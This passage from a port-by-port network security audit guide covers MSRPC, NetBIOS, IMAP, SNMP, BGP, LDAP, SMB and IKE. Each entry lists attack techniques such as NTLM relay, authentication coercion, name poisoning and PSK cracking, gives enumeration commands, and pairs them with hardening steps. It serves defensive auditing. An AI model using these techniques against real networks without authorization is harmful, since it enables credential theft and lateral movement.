  * **Unauthenticated Interface Enumeration (`epmapper` dump)**: Query `135/TCP` without credentials to list all bound RPC UUIDs, annotations, internal IP addresses (on multi-homed hosts via `IOXIDResolver` `ServerAlive2`), and running Windows services (e.g., identifying if AD CS `IF_IRP` is installed).
  * **RPC Coercion Primitives**: Check exposure of RPC interfaces that coerce a Windows server to authenticate outbound via SMB/HTTP (`PetitPotam` `MS-EFSR` `efsrpc`, `PrinterBug` `MS-RPRN`, `DFSCoerce` `MS-DFSNM`, `ShadowCoerce` `MS-FSRVP`).
  * **Lateral Movement via WMI / DCOM (`MMC20.Application`, `ShellWindows`, `ShellBrowserWindow`)**: Test whether administrative credentials allow remote command execution over `135/TCP` + dynamic ports without touching SMB (`445/TCP`).
  * **Missing `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`**: Verify that DCOM hardening (KB5004442) and AD CS RPC encryption are enforced to prevent NTLM relay to `135/TCP`.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Dump all registered MSRPC Endpoint Mapper UUIDs, bindings, and annotations via Impacket rpcdump
  impacket-rpcdump -port 135 <target-ip>

  # 2. Enumerate multi-homed network interfaces without authentication via IOXIDResolver (Nmap)
  nmap -sV -p 135 --script msrpc-enum <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * Permitting `135/TCP` and `49152-65535/TCP` laterally across workstation-to-workstation VLANs.
  * Leaving legacy Active Directory Certificate Services (AD CS) `ICertPassage` RPC interface enabled without enforcing `IF_ENFORCEENCRYPTICERTREQUEST` (**ESC11** NTLM Relay to RPC).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Restrict Dynamic RPC Port Range & Firewall Rules**:
    ```powershell
    # Restrict dynamic RPC port allocation to a manageable 200-port range if firewalling is required
    netsh int ipv4 set dynamicport tcp start=50000 num=200
    # Enforce RPC Endpoint Mapper Client Authentication via Registry / GPO
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Rpc" -Name "EnableAuthEpResolution" -Value 1 -Type DWord
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Rpc" -Name "RestrictRemoteClients" -Value 1 -Type DWord
    ```
  * **AD CS ESC11 Mitigation**: Run `certutil -setreg policy\EditFlags +EDITF_ENCRYPTICERTREQUEST` and restart `CertSvc`.

---

### [PORT-14] Ports 137/UDP, 138/UDP, 139/TCP — NetBIOS over TCP/IP (NBT: NBNS, NBDGM, NBSSN)

* **Transport Protocol & IANA Assignment**:
  * `137/UDP` (and `137/TCP`): NetBIOS Name Service (`NBNS`).
  * `138/UDP`: NetBIOS Datagram Service (`NBDGM`).
  * `139/TCP`: NetBIOS Session Service (`NBSSN`).
* **RFC Specification**: RFC 1001 (Protocol Standard for a NetBIOS Service on a TCP/UDP Transport: Concepts and Methods), RFC 1002 (Detailed Specifications).
* **Architecture & Handshake Overview**:
  NetBIOS over TCP/IP (NBT) is a legacy 1980s session-layer API that predates direct DNS and SMB-over-TCP (`445`).
  1. **NetBIOS Naming (`137/UDP`)**: NetBIOS names are fixed 16-byte ASCII strings padded with spaces (`0x20`), where the 16th byte is a **Suffix Byte** indicating the service type: `<00>` Workstation Service, `<03>` Messenger, `<1B>` Domain Master Browser, `<1C>` Domain Controllers, `<20>` File Server Service. When DNS resolution fails on legacy Windows networks, hosts broadcast `NBNS Name Query` packets to `137/UDP`.
  2. **NetBIOS Session Setup (`139/TCP`)**: Before SMB commands can be exchanged over `139/TCP`, the client must send a NetBIOS `Session Request` (`0x81`) specifying the `Called Name` (server NetBIOS name) and `Calling Name`, waiting for a `Positive Session Response` (`0x82`).
* **Authorized Security Audit Checklist**:
  * **NBNS / LLMNR Name Poisoning**: On flat Layer 2 broadcast domains, any host broadcasting an unresolvable name on `137/UDP` (or LLMNR `5355/UDP` / mDNS `5353/UDP`) will trust a forged unicast response from an attacker (e.g., `Responder`), causing the victim to send its **NTLMv2 challenge-response hash** to the attacker's SMB/HTTP listener.
  * **Information Disclosure (`NBSTAT`)**: Sending a unicast `NBSTAT` node status query to `137/UDP` returns the target's hostname, Active Directory domain/workgroup name, logged-in service suffixes, and burned-in MAC address without authentication.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Query NetBIOS Name Table, Workgroup/Domain, and MAC address over UDP/137
  nbtscan -v <target-ip-or-cidr>
  sudo nmap -sU -p 137 --script nbstat <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * Leaving NetBIOS over TCP/IP set to `Default` (enabled via DHCP or static IPv4 adapter) on modern Windows 10/11 and Windows Server 2019/2022 endpoints where DNS completely replaces NetBIOS.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Disable NetBIOS over TCP/IP & LLMNR Enterprise-Wide (CIS Windows Benchmark 18.6.x)**:
    ```powershell
    # Disable NetBIOS over TCP/IP (TcpipNetbiosOptions = 2) on all network adapters via WMI/CIM
    Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled=TRUE" |
      Invoke-CimMethod -MethodName SetTcpipNetbios -Arguments @{TcpipNetbiosOptions = [uint32]2}

    # Disable Multicast Name Resolution (LLMNR) via GPO / Registry
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
      -Name "EnableMulticast" -Value 0 -PropertyType DWord -Force
    ```

---

### [PORT-15] Ports 143/TCP, 993/TCP — Internet Message Access Protocol (IMAP4rev1 / IMAP4rev2 / IMAPS)

* **Transport Protocol & IANA Assignment**: `143/TCP` (IMAP with `STARTTLS`), `993/TCP` (Implicit TLS IMAPS, RFC 8314).
* **RFC Specification**: RFC 3501 (IMAP4rev1), RFC 9051 (IMAP4rev2), RFC 8314 (Use of TLS for Email Access).
* **Architecture & Handshake Overview**:
  Unlike POP3, IMAP is a stateful server-side mailbox synchronization protocol supporting concurrent folder access, server-side search, and asynchronous push notifications (`IDLE`).
  1. **Command Tagging**: Every client command is prefixed with a unique alphanumeric tag (e.g., `A001 CAPABILITY`, `A002 LOGIN user pass`, `A003 SELECT INBOX`), allowing the server to process multiple pipelined commands asynchronously and return untagged data (`* FLAGS (\Answered \Flagged)`) followed by the tagged completion status (`A003 OK [READ-WRITE] Select completed`).
  2. **States**: `Not Authenticated` -> `Authenticated` (after `LOGIN` or `AUTHENTICATE XOAUTH2`) -> `Selected` (after `SELECT` or `EXAMINE` on a mailbox) -> `Logout`.
* **Authorized Security Audit Checklist**:
  * Check if `LOGINDISABLED` is absent from the unencrypted `143/TCP` `CAPABILITY` response, which indicates cleartext passwords are accepted without `STARTTLS`.
  * Test for password spraying and legacy basic authentication bypass of MFA (when conditional access blocks webmail MFA bypasses but overlooks IMAP/POP3).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap IMAP capabilities and NTLM/TLS audit
  nmap -sV -p 143,993 --script imap-capabilities,imap-ntlm-info,ssl-enum-ciphers <target-ip>

  # 2. Connect to IMAPS (993/TCP) and send a tagged CAPABILITY command
  openssl s_client -connect <target-ip>:993 -crlf -quiet <<< "a001 CAPABILITY"
  ```
* **Common Configuration Weaknesses**:
  * Allowing Basic Authentication on IMAP (`993/TCP`) in hybrid Exchange/M365 or Dovecot environments, providing a trivial single-factor MFA bypass vector.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * Disable Basic Authentication (`AUTH=PLAIN`, `LOGIN`) on IMAP; enforce OAuth 2.0 (`XOAUTH2` / `OAUTHBEARER`) tied to Conditional Access Policies and FIDO2 MFA. In Dovecot (`/etc/dovecot/conf.d/10-ssl.conf`), set `ssl = required` and `disable_plaintext_auth = yes`.

---

## Section 2: Enterprise Directory, Routing, Storage & Remote Management Protocols (Entries 16–30)

---

### [PORT-16] Ports 161/UDP, 162/UDP (10161/TCP, 10162/TCP) — Simple Network Management Protocol (SNMP v1 / v2c / v3)

* **Transport Protocol & IANA Assignment**:
  * `161/UDP`: SNMP Agent polling listener (`GetRequest`, `GetNextRequest`, `GetBulkRequest`, `SetRequest`).
  * `162/UDP`: SNMP Trap / Inform receiver (`SNMPv2-Trap`, `InformRequest`).
  * `10161/TCP` & `10162/TCP`: SNMP over TLS / DTLS (RFC 6353).
* **RFC Specification**: RFC 1157 (SNMPv1), RFC 1901–1908 (Community-based SNMPv2c), RFC 3411–3418 (SNMPv3 Architecture, User-based Security Model `USM`, View-based Access Control Model `VACM`), RFC 3826 (AES Cipher Algorithm in the SNMP USM).
* **Architecture & Handshake Overview**:
  SNMP organizes device telemetry and configuration into a hierarchical tree of Object Identifiers (**OIDs**) defined by Management Information Bases (**MIBs**) and encoded on the wire using ASN.1 Basic Encoding Rules (**BER**).
  1. **SNMPv1 & SNMPv2c (Community-String Authentication)**: Every UDP packet contains a cleartext `community` string (traditionally `public` for read-only and `private` for read-write). There is zero cryptographic encryption or message integrity; anyone who captures a packet or guesses the community string can walk the entire MIB tree (`1.3.6.1.2.1` MIB-2) or modify device configuration via `SetRequest`.
  2. **SNMPv3 (`USM` Security Levels)**: Introduces three explicit security levels:
     * `noAuthNoPriv`: Username only, no integrity or encryption.
     * `authNoPriv`: HMAC-SHA-2 (`SHA-256`/`SHA-512`) message authentication and replay protection (`msgAuthoritativeEngineBoots` + `msgAuthoritativeEngineTime`).
     * `authPriv`: Full authentication (`HMAC-SHA-256`) plus payload encryption (`CFB128-AES-128` / `AES-256`).
* **Authorized Security Audit Checklist**:
  * **Default/Weak Community Strings (`v1`/`v2c`)**: Test `public`, `private`, `manager`, `cisco`, and organization-specific strings. A valid read-only community string leaks the full ARP table, routing table, running process list (`HOST-RESOURCES-MIB::hrSWRunName`, including command-line arguments and passwords), interface traffic, and software versions.
  * **Read-Write (`private`) Exploitation**: On Cisco IOS/NX-OS devices (`CISCO-CONFIG-COPY-MIB`), a read-write community string allows an attacker to trigger an immediate TFTP/SCP upload of the router's `running-config` (containing `enable secret` hashes, BGP keys, and IPsec PSKs) or merge a malicious configuration file granting level-15 VTY access.
  * **SNMPv3 EngineID Discovery & Offline Password Cracking**: Even when SNMPv3 `authPriv` is used, if `USM` relies on a weak passphrase, an attacker can send a discovery packet, elicit a signed `Report`/`Response` PDU, and brute-force the HMAC passphrase offline.
  * **SNMP `GetBulkRequest` DDoS Amplification**: Unauthenticated `v2c` `GetBulk` requests on `161/UDP` yield up to 650x UDP amplification.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap SNMP audit: brute-force communities, enumerate processes, interfaces, users, and netstat
  sudo nmap -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-processes,snmp-interfaces,snmp-netstat,snmp-win32-users <target-ip>

  # 2. Walk the entire system MIB tree using SNMPv2c (sysDescr .1.3.6.1.2.1.1.1.0 & hrSWRunName)
  snmpwalk -v2c -c public <target-ip> 1.3.6.1.2.1.1
  snmpwalk -v2c -c public <target-ip> 1.3.6.1.2.1.25.4.2.1.2

  # 3. Authenticated & Encrypted SNMPv3 (authPriv with SHA-256 and AES-128) query
  snmpwalk -v3 -l authPriv -u <secName> -a SHA-256 -A "<AuthPass>" -x AES -X "<PrivPass>" <target-ip> 1.3.6.1.2.1.1
  ```
* **Common Configuration Weaknesses**:
  * Enabling SNMPv1/v2c with `rocommunity public` bound to `0.0.0.0` in `/etc/snmp/snmpd.conf`.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Disable SNMPv1/v2c & Enforce SNMPv3 `authPriv` (`/etc/snmp/snmpd.conf` & Cisco IOS)**:
    ```ios
    ! Cisco IOS-XE SNMPv3 authPriv Hardening with ACL restriction
    ip access-list standard ACL_SNMP_NMS
     permit 10.100.50.10
     deny   any log
    snmp-server view VIEW_RO iso included
    snmp-server group GRP_SNMPV3 v3 priv read VIEW_RO access ACL_SNMP_NMS
    snmp-server user NMS_AUDITOR GRP_SNMPV3 v3 auth sha <Strong24CharAuthSecret> priv aes 256 <Strong24CharPrivSecret>
    ```

---

### [PORT-17] Port 179/TCP — Border Gateway Protocol (BGP-4)

* **Transport Protocol & IANA Assignment**: `179/TCP` (Inter-Autonomous System routing protocol).
* **RFC Specification**: RFC 4271 (A Border Gateway Protocol 4 — BGP-4), RFC 5925 (The TCP Authentication Option `TCP-AO`), RFC 7454 (BGP Operations and Security), RFC 6811 (BGP Prefix Origin Validation / RPKI), RFC 8205 (BGPsec Protocol Specification), RFC 5082 (Generalized TTL Security Mechanism `GTSM`).
* **Architecture & Handshake Overview**:
  BGP-4 is the path-vector routing protocol that binds the global Internet's Autonomous Systems (**ASNs**) together.
  1. **Finite State Machine (FSM)**: `Idle` -> `Connect` (initiates TCP handshake to `179/TCP`) -> `Active` -> `OpenSent` (sends BGP `OPEN` message containing BGP Version `4`, local `My Autonomous System`, `Hold Time`, `BGP Identifier` router ID, and `Optional Parameters` capabilities) -> `OpenConfirm` (waits for `KEEPALIVE`) -> `Established` (exchanges `UPDATE` and `NOTIFICATION` messages).
  2. **Path Attributes in `UPDATE` Messages**: Routes (NLRI — Network Layer Reachability Information) carry attributes including `ORIGIN`, `AS_PATH` (loop prevention and path length metric), `NEXT_HOP`, `LOCAL_PREF`, `MED`, and `COMMUNITY`.
* **Authorized Security Audit Checklist**:
  * **Unauthenticated BGP Peering & TCP RST Injection**: Verify that all eBGP and iBGP sessions are protected by **TCP-AO (RFC 5925)** (or legacy TCP MD5 Signature Option 19 RFC 2385) and **GTSM / TTL Security (RFC 5082)**, which drops any BGP TCP packet arriving with an IP `TTL < 254` (for directly connected peers), neutralizing remote off-path spoofing.
  * **BGP Prefix Hijacking & Sub-Prefix Hijacking**: Audit whether the router validates **RPKI (Resource Public Key Infrastructure) Route Origin Authorizations (ROAs)** and drops `Invalid` origin announcements. Without RPKI, a rogue AS announcing a more specific `/24` prefix (out-competing a legitimate `/22` via longest-prefix match) can blackhole or MITM global Internet traffic (as seen in historic cryptocurrency DNS/BGP hijacks).
  * **Maximum-Prefix Exhaustion**: Ensure `neighbor <ip> maximum-prefix <limit>` is configured on all external peers to prevent accidental full-table route leaks from crashing router FIB/RIB memory.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Verify if TCP Port 179 is reachable from untrusted networks
  nmap -sT -Pn -p 179 <router-ip>

  # 2. Query RPKI ROA validity and AS_PATH for an enterprise IP prefix via Whois / BGPalerter / RIPE Stat API
  curl -s "https://stat.ripe.net/data/rpki-validation/data.json?resource=<ASN>&prefix=<IP_PREFIX>" | jq .
  ```
* **Common Configuration Weaknesses**:
  * Leaving `179/TCP` open in edge router Control Plane Policing (CoPP) ACLs to non-peer IP addresses.
  * Accepting bogon prefixes (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, or the organization's own ASN in inbound `AS_PATH`) from eBGP peers.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **MANRS (Mutually Agreed Norms for Routing Security) & RFC 7454 Hardening (Cisco IOS-XR / FRRouting)**:
    ```ios
    router bgp 65001
     neighbor 198.51.100.2 remote-as 65002
     neighbor 198.51.100.2 ttl-security hops 1
     neighbor 198.51.100.2 password encrypted <StrongKey>
     neighbor 198.51.100.2 maximum-prefix 50000 80 warning-only
     neighbor 198.51.100.2 route-map RM_EBGP_IN in
     neighbor 198.51.100.2 route-map RM_EBGP_OUT out
    ```
  * Enforce **RPKI Origin Validation** (`rpki-server` via RTR protocol on port `323/TCP` or `8282/TCP`) and reject `rpki invalid` prefixes in `RM_EBGP_IN`.

---

### [PORT-18] Ports 389/TCP, 389/UDP, 636/TCP, 3268/TCP, 3269/TCP — Lightweight Directory Access Protocol (LDAP / LDAPS / Global Catalog)

* **Transport Protocol & IANA Assignment**:
  * `389/TCP` & `389/UDP` (`CLDAP`): Standard LDAP directory access (supports SASL Sign & Seal or `StartTLS` OID `1.3.6.1.4.1.1466.20037`).
  * `636/TCP`: Implicit TLS LDAP (`LDAPS`).
  * `3268/TCP` (Cleartext/StartTLS) & `3269/TCP` (TLS): Microsoft Active Directory Global Catalog (GC — forest-wide read-only partial replica).
* **RFC Specification**: RFC 4511 (LDAP: The Protocol), RFC 4513 (LDAP: Authentication Methods and Security Mechanisms), RFC 4515 (LDAP: String Representation of Search Filters), `[MS-ADTS]` (Active Directory Technical Specification).
* **Architecture & Handshake Overview**:
  LDAP queries and modifies hierarchical Directory Information Trees (**DIT**) composed of entries identified by Distinguished Names (**DNs**, e.g., `CN=Administrator,CN=Users,DC=corp,DC=local`) and encoded via ASN.1 BER.
  1. **Bind Operation (`BindRequest` -> `BindResponse`)**:
     * **Anonymous Bind**: Empty DN and empty password (used to query `rootDSE` metadata such as `namingContexts`, `supportedSASLMechanisms`, `domainFunctionality`).
     * **Simple Bind**: Sends full `DN` and cleartext password inside the BER structure. Dangerous unless wrapped inside `LDAPS` (`636`) or `StartTLS` (`389`).
     * **SASL Bind (`GSSAPI` / `GSS-SPNEGO`)**: Uses Kerberos or NTLMSSP to authenticate and optionally negotiate **LDAP Signing** (integrity checksums on every PDU) and **LDAP Channel Binding** (`CBT`, which cryptographically binds the inner SPNEGO/NTLM authentication token to the outer `636/TCP` TLS server certificate thumbprint).
  2. **Search Operation (`SearchRequest`)**: Specifies `baseObject`, `scope` (`baseObject`, `singleLevel`, `wholeSubtree`), `filter` (e.g., `(&(objectCategory=person)(objectClass=user)(adminCount=1))`), and requested attributes.
* **Authorized Security Audit Checklist**:
  * **NTLM Relay to LDAP / LDAPS**: If a Domain Controller neither enforces **LDAP Signing** (`LDAPServerIntegrity = 2` on `389/TCP`) nor enforces **LDAP Channel Binding** (`LdapEnforceChannelBinding = 2` on `636/TCP`), an attacker who coerces an authentication from a computer account (via SMB `PetitPotam` or WebDAV `http://attacker@80/path`) can relay that NTLM authentication directly to `ldap://` or `ldaps://` to grant `DCSync` privileges or configure **Resource-Based Constrained Delegation (`msDS-AllowedToActOnBehalfOfOtherIdentity`)**.
  * **Anonymous / Null Bind & Authenticated Enumeration**: Check if Anonymous Bind allows dumping the DIT (`ldap_anonymous_bind`). With any low-privileged domain user account, audit whether sensitive attributes (`unixUserPassword`, `ms-Mcs-AdmPwd` LAPS v1 passwords, `msLAPS-Password`, `description` fields containing hardcoded credentials, `gPLink`, and ACLs via BloodHound/SharpHound) are exposed.
  * **CLDAP (`389/UDP`) Reflection DDoS**: Unauthenticated Connectionless LDAP (`CLDAP`) rootDSE queries on `389/UDP` produce a 56x to 70x UDP amplification factor if exposed externally.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Query LDAP rootDSE anonymously to discover AD namingContexts, DNS hostnames, and SASL mechanisms
  ldapsearch -x -H ldap://<dc-ip>:389 -b "" -s base "(objectclass=*)" namingContexts dnsHostName supportedSASLMechanisms

  # 2. Verify whether LDAP Signing (389) and LDAPS Channel Binding (636) are enforced via NetExec (nxc)
  nxc ldap <dc-ip> -u '<user>' -p '<pass>' -M ldap-checker

  # 3. Search for privileged accounts (adminCount=1) over LDAPS using Simple/SASL bind
  LDAPTLS_REQCERT=demand ldapsearch -H ldaps://<dc-fqdn>:636 -D "auditor@corp.local" -W \
    -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName servicePrincipalName
  ```
* **Common Configuration Weaknesses**:
  * Setting *Domain controller: LDAP server signing requirements* to `None` or `Negotiate signing` instead of `Require signing`.
  * Setting *Domain controller: LDAP server channel binding token requirements* to `Never` instead of `Always`.
  * Legacy multi-function printers (MFPs), Jenkins servers, or Linux appliances configured with Simple Bind over cleartext `389/TCP` using a Domain Admin service account.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Active Directory Domain Controller Hardening (CIS Windows Server Benchmark 2.3.5.x)**:
    ```powershell
    # Enforce LDAP Server Signing (Registry value 2 = Require signing)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
      -Name "LDAPServerIntegrity" -Value 2 -Type DWord

    # Enforce LDAP Channel Binding Tokens (Registry value 2 = Always)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
      -Name "LdapEnforceChannelBinding" -Value 2 -Type DWord
    ```
  * Audit Event ID `2886`, `2887`, `2888`, and `2889` in the `Directory Service` event log to identify every client IP still attempting unsigned Simple/SASL LDAP binds or missing Channel Binding Tokens before switching enforcement to `Always`.

---

### [PORT-19] Port 445/TCP (443/UDP) — Server Message Block (SMB v2 / v3 / CIFS / SMB over QUIC)

* **Transport Protocol & IANA Assignment**:
  * `445/TCP`: Direct TCP transport for SMB (v1, v2.0, v2.1, v3.0, v3.0.2, v3.1.1).
  * `443/UDP`: SMB over QUIC (Windows Server 2022 Azure Edition / Windows Server 2025, encapsulating SMB 3.1.1 inside TLS 1.3 QUIC tunnels).
* **RFC Specification**: Microsoft `[MS-SMB]` (SMBv1 — Deprecated), `[MS-SMB2]` (Server Message Block Protocol Versions 2 and 3), `[MS-SRVS]` (Server Service Remote Protocol), `[MS-LSAD]`/`[MS-SAMR]` (Named Pipes over `IPC$`).
* **Architecture & Handshake Overview**:
  SMB is the foundational file sharing, named-pipe RPC transport (`\pipe\samr`, `\pipe\lsarpc`, `\pipe\svcctl`, `\pipe\atsvc`), and Group Policy (`SYSVOL`/`NETLOGON`) protocol in Windows and Samba enterprise networks.
  1. **Dialect Negotiation (`SMB2 NEGOTIATE`)**: Client sends supported dialects (`0x0202` SMB 2.0.2 up to `0x0311` SMB 3.1.1) and Negotiate Contexts (`SMB2_PREAUTH_INTEGRITY_CAPABILITIES` using SHA-512 hash chaining over the negotiation transcript, and `SMB2_ENCRYPTION_CAPABILITIES` using `AES-128-GCM` / `AES-256-GCM`). Server responds with the highest mutually supported dialect, its `SecurityMode` (`SMB2_NEGOTIATE_SIGNING_ENABLED` vs. `SMB2_NEGOTIATE_SIGNING_REQUIRED`), and SPNEGO security blob.
  2. **Authentication (`SMB2 SESSION_SETUP`)**: Client authenticates via SPNEGO (Kerberos `KRB_AP_REQ` or NTLMSSP 3-message challenge/response). Both sides derive the `SessionKey`, from which SMBv3 derives distinct `SigningKey` (`AES-128-CMAC` / `AES-128-GMAC`) and `EncryptionKey` / `DecryptionKey` via SP 800-108 KDF.
  3. **Share & Named Pipe Access (`SMB2 TREE_CONNECT` -> `CREATE` -> `READ`/`WRITE`/`IOCTL`)**: Connects to disk shares (`C$`, `ADMIN$`, `SYSVOL`) or the inter-process communication share (`IPC$`) to invoke DCE/RPC over Named Pipes (`psexec`, `smbexec`, `secretsdump`).
* **Authorized Security Audit Checklist**:
  * **SMB Signing Not Required (`signing: False`)**: This is the single most exploited internal Windows misconfiguration. If `RequireSecuritySignature` is disabled on workstations or member servers, an attacker can capture an incoming NTLMv2 authentication and use `ntlmrelayx.py` to relay it to `445/TCP` on another host, executing commands via `svcctl` (`ServiceManager`) or dumping the local `SAM` and `LSA` secrets (`secretsdump`) if the relayed user has local admin rights.
  * **Legacy SMBv1 Exposure**: Verify SMBv1 (`NT LM 0.12`) is completely uninstalled to eliminate **MS17-010 (EternalBlue/EternalRomance)**. Also verify patches for **SMBv3.1.1 Compression RCE (SMBGhost CVE-2020-0796)**.
  * **Null Sessions, Guest Access & Unauthenticated Shares**: Test whether blank credentials (`-u '' -p ''`) or random usernames (which trigger `STATUS_LOGON_FAILURE` vs. **Guest Fallback** when the username does not exist) can list shares (`IPC$`, `Users`, `Backups`) or query `\pipe\samr` and `\pipe\lsarpc` for domain user/password policy enumeration.
  * **SYSVOL / Share Credential Hunting**: Audit readable SMB shares for unattended installation files (`Unattend.xml`), legacy Group Policy Preferences (`Groups.xml` `cpassword` AES-encrypted with Microsoft's publicly documented static key), scripts containing hardcoded credentials, and writable binaries/shortcuts (`.lnk` / `.scf` poisoning).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap audit for SMB dialects, SMB signing requirement, and MS17-010 / SMB vulnerability status
  nmap -sV -p 445 --script smb-protocols,smb2-security-mode,smb2-capabilities,smb-enum-shares <target-ip>

  # 2. Check SMB signing requirement, OS build, and Null/Guest session access across a subnet via NetExec
  nxc smb <target-cidr>
  nxc smb <target-ip> -u '' -p '' --shares
  nxc smb <target-ip> -u 'nonexistent_guest_probe' -p '' --shares

  # 3. Authenticated recursive spidering for sensitive files across readable SMB shares (manspider / smbclient)
  smbclient -L //<target-ip>/ -U "CORP/auditor"
  ```
* **Common Configuration Weaknesses**:
  * Windows 10/11 and Windows Server member hosts ship historically with `Microsoft network server: Digitally sign communications (always)` set to **Disabled** by default (only Domain Controllers have it enabled out-of-the-box prior to Windows 11 24H2 / Server 2025).
  * Sharing local drives (`D:\Backups`) with `Everyone: Full Control` share permissions without restrictive NTFS ACLs.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Enforce SMB Signing, SMBv3 Encryption, and Disable SMBv1 (CIS Windows Benchmark 2.3.8.x / 2.3.9.x)**:
    ```powershell
    # 1. Permanently remove SMBv1 protocol driver
    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

    # 2. Require SMB Signing on both SMB Server and SMB Client, and enable SMBv3 Encryption
    Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -EncryptData $true -RejectUnencryptedAccess $true -Force
    Set-SmbClientConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -EnableInsecureGuestLogons $false -Force

    # 3. Restrict Anonymous access to Named Pipes and Shares (CIS 2.3.10.x)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RestrictNullSessAccess" -Value 1 -Type DWord
    ```
  * **Samba Hardening (`/etc/samba/smb.conf`)**:
    ```ini
    [global]
    server min protocol = SMB3_11
    client min protocol = SMB3_11
    server signing = mandatory
    smb encrypt = required
    restrict anonymous = 2
    map to guest = Never
    ```

---

### [PORT-20] Ports 500/UDP, 4500/UDP (IP Protocols 50 ESP, 51 AH) — Internet Key Exchange & IPsec VPN (IKEv1 / IKEv2)

* **Transport Protocol & IANA Assignment**:
  * `500/UDP`: Internet Key Exchange (`IKEv1` / `IKEv2` control-plane negotiation).
  * `4500/UDP`: IPsec NAT Traversal (`NAT-T`, encapsulating both IKE control packets and ESP data packets inside UDP `4500` to traverse stateful NAPT routers).
  * IP Protocol `50`: Encapsulating Security Payload (`ESP` — confidentiality, origin authentication, anti-replay).
  * IP Protocol `51`: Authentication Header (`AH` — integrity only, incompatible with NAT).
* **RFC Specification**: RFC 4301 (Security Architecture for the Internet Protocol), RFC 4303 (IPv6/IPv4 ESP), RFC 7296 (Internet Key Exchange Protocol Version 2 — `IKEv2`), RFC 2409 (`IKEv1` — Obsoleted), RFC 8221 (Cryptographic Algorithm Implementation Requirements and Usage Guidance for ESP and AH).
* **Architecture & Handshake Overview**:
  IPsec separates control-plane key negotiation (`IKE` on UDP `500`/`4500`) from data-plane packet encryption (`ESP`):
  1. **IKEv1 (Obsolete — Phase 1 Main Mode vs. Aggressive Mode)**:
     * **Main Mode (6 packets)**: Uses 3 round-trips; messages 5 and 6 (containing peer identities `IDii`/`IDir` and authentication hashes `HASH_I`/`HASH_R`) are encrypted under the Diffie-Hellman shared secret.
     * **Aggressive Mode (3 packets)**: Compresses Phase 1 into 3 unencrypted packets (`HDR, SA, KE, Ni, IDii` -> `HDR, SA, KE, Nr, IDir, HASH_R` -> `HDR, HASH_I`). Because the Responder returns its unencrypted `HASH_R` (an HMAC over the negotiation transcript keyed with the Pre-Shared Key `PSK`) in packet 2 to any unauthenticated Initiator, an attacker can harvest `HASH_R` and crack the PSK offline.
  2. **IKEv2 (Modern — 4 packets)**:
     * **Exchange 1 (`IKE_SA_INIT`)**: 2 packets negotiating cryptographic proposals (`AES-GCM-256`, `PRF_HMAC_SHA2_384`, `ECP_384` DH Group 20 / Curve25519 DH Group 31), nonces, and Diffie-Hellman public values.
     * **Exchange 2 (`IKE_AUTH`)**: Fully encrypted under the `SKEYSEED` keys derived in `IKE_SA_INIT`. Authenticates peer identities via X.509 certificates, EAP-TLS, or high-entropy PSK and establishes the first `CHILD_SA` (ESP Security Association).
* **Authorized Security Audit Checklist**:
  * **IKEv1 Aggressive Mode PSK Cracking**: Probe `500/UDP` using `ike-scan -A` (Aggressive Mode) with common transform sets and Group IDs. If the VPN concentrator returns an Aggressive Mode handshake containing the `HASH_R` payload, extract it for offline cracking (`psk-crack` / `hashcat -m 5400`).
  * **Weak Diffie-Hellman Groups & Legacy Ciphers**: Audit whether the gateway accepts Oakley Group 1 (`768-bit` MODP), Group 2 (`1024-bit` MODP), Group 5 (`1536-bit` MODP), `DES`, `3DES`, or `MD5` HMACs.
  * **Vendor Fingerprinting (`VID`) & CVE Assessment**: Inspect Vendor ID (`VID`) payloads in `IKE_SA_INIT` responses to fingerprint Cisco ASA, Fortinet FortiGate, Palo Alto GlobalProtect, SonicWall, or StrongSwan versions.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Discover IKEv1/IKEv2 responders and fingerprint Vendor IDs via ike-scan
  sudo ike-scan -v -M <target-ip>
  sudo ike-scan -v -2 <target-ip>

  # 2. Test whether IKEv1 Aggressive Mode is enabled (without cracking, inspecting handshake response)
  sudo ike-scan -M -A -n <group-id> <target-ip>

  # 3. Nmap IKE version and Vendor ID detection script
  sudo nmap -sU -p 500,4500 --script ike-version <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * Enabling IKEv1 alongside IKEv2 for legacy backward compatibility with short, human-memorable Pre-Shared Keys (`P@ssw0rdVPN!`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **StrongSwan (`swanctl.conf`) & Enterprise VPN Hardening (RFC 8221 / CNSA 2.0)**:
    * Disable **IKEv1** completely (`version = 2`).
